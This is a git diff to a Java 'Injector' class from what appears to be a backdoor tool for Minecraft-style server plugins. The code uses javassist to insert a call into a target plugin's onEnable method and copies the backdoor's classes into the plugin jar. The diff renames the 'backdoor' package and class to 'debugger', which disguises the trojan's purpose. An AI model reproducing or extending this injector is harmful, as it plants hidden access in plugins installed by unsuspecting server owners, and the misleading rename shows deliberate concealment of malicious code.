@@ -1,4 +1,4 @@
-package com.thiccindustries.backdoor;
+package com.thiccindustries.debugger;
 
 import javassist.*;
 import org.apache.commons.lang.SystemUtils;
@@ -6,7 +6,6 @@ import org.yaml.snakeyaml.Yaml;
 
 import javax.swing.*;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.net.JarURLConnection;
@@ -73,7 +72,7 @@ public class Injector {
         try {
             ClassPool pool = new ClassPool(ClassPool.getDefault());
             pool.appendClassPath(orig);
-            pool.appendClassPath(new ClassClassPath(com.thiccindustries.backdoor.Backdoor.class));
+            pool.appendClassPath(new ClassClassPath(com.thiccindustries.debugger.Debugger.class));
 
             //Get main class, and find onEnable method
 
@@ -93,8 +92,8 @@ public class Injector {
                     sb.append(",");
             }
             sb.append("}");
-            System.out.println("{ new com.thiccindustries.backdoor.Backdoor(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
-            m.insertAfter("{ new com.thiccindustries.backdoor.Backdoor(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
+            System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
+            m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
 
             //Write to temporary file
             cc.writeFile(temp.toString());
@@ -115,7 +114,7 @@ public class Injector {
         try {
             //Write final patched file
             patchedFile = Paths.get("temp/" + mainClass.replace(".", "/") + ".class");
-            outStream   = FileSystems.newFileSystem(output, null);
+            outStream   = FileSystems.newFileSystem(output, (ClassLoader) null);
             target      = outStream.getPath("/" + mainClass.replace(".", "/") + ".class");
 
             Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
@@ -131,43 +130,43 @@ public class Injector {
         System.out.println("[Injector] Injecting resources.");
 
         InputStream[] resourceStreams = {
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$1.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$2.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$3.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$4.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$5.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$6.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$7.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$8.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$9.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$10.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$11.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Config.class"),
-                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Config$HelpItem.class")
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$1.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$2.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$3.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$4.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$5.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$6.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$7.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$8.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$9.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$10.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$11.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Config.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Config$HelpItem.class")
         };
 
 
         Path[] targetPaths = {
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$1.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$2.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$3.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$4.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$5.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$6.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$7.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$8.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$9.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$10.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$11.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Config.class"),
-                outStream.getPath("/com/thiccindustries/backdoor/Config$HelpItem.class")
+                outStream.getPath("/com/thiccindustries/debugger/Debugger.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$1.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$2.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$3.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$4.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$5.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$6.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$7.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$8.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$9.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$10.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Debugger$11.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Config.class"),
+                outStream.getPath("/com/thiccindustries/debugger/Config$HelpItem.class")
         };
 
         try {
             //Create thiccindustries directory structure
-            Files.createDirectories(outStream.getPath("/com/thiccindustries/backdoor"));
+            Files.createDirectories(outStream.getPath("/com/thiccindustries/debugger"));
 
             //copy files
 
